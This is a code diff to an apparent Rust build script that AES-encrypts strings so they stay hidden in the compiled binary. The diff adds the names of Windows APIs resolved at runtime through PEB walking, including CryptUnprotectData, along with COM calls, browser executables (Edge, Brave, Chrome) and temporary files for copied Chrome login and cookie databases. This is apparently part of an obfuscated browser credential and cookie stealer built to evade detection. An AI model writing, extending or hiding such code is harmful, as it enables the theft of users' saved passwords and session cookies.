@@ -79,6 +79,36 @@ fn main() {
         ("JSON_KEY_ERROR",    "error"),
         // Fallback result path when env var is absent
         ("RESULT_FALLBACK",   "chrome_recovery_result.json"),
+        // Core kernel exports resolved via PEB walking
+        ("API_LOAD_LIBRARY",        "LoadLibraryA"),
+        ("API_GET_PROC",            "GetProcAddress"),
+        ("API_LOCAL_FREE",          "LocalFree"),
+        ("API_CRYPT_UNPROTECT",     "CryptUnprotectData"),
+        ("DLL_CRYPT32",             "crypt32.dll"),
+        // DLL names resolved at runtime — not visible as plaintext
+        ("DLL_OLE32",       "ole32.dll"),
+        ("DLL_OLEAUT32",    "oleaut32.dll"),
+        ("DLL_KERNEL32",    "kernel32.dll"),
+        // COM API names — resolved via GetProcAddress at runtime
+        ("API_CO_INIT",     "CoInitializeEx"),
+        ("API_CO_UNINIT",   "CoUninitialize"),
+        ("API_CO_CREATE",   "CoCreateInstance"),
+        ("API_CO_PROXY",    "CoSetProxyBlanket"),
+        ("API_SYS_ALLOC",   "SysAllocStringByteLen"),
+        ("API_SYS_FREE",    "SysFreeString"),
+        ("API_SYS_LEN",     "SysStringByteLen"),
+        // Browser exe names for CLSID selection
+        ("EXE_EDGE",        "msedge.exe"),
+        ("EXE_BRAVE",       "brave.exe"),
+        ("EXE_CHROME",      "chrome.exe"),
+        // Chrome variant path fragments
+        ("CHROME_SXS",      "chrome sxs"),
+        ("CHROME_SXS_PATH", "\\sxs\\"),
+        ("CHROME_DEV",      "chrome dev"),
+        ("CHROME_BETA",     "chrome beta"),
+        // Temp DB filenames
+        ("TMPDB_LOGIN",     "chrome_login_data_tmp.db"),
+        ("TMPDB_COOKIES",   "chrome_cookies_tmp.db"),
     ];
 
     // dtb.rs strings (SQLite queries + filenames)
@@ -109,7 +139,7 @@ fn main() {
     ];
 
     for (i, (name, plaintext)) in strings.iter().enumerate() {
-        let key = rand_key(base_seed.wrapping_add(i as u64 * 0x1234567890ABCDEF));
+        let key = rand_key(base_seed.wrapping_add((i as u64).wrapping_mul(0x1234567890ABCDEF)));
         let (ct, nonce) = aes256gcm_encrypt(plaintext.as_bytes(), &key);
         lines.push(fmt_key_array(name, &key));
         lines.push(fmt_nonce_array(name, &nonce));
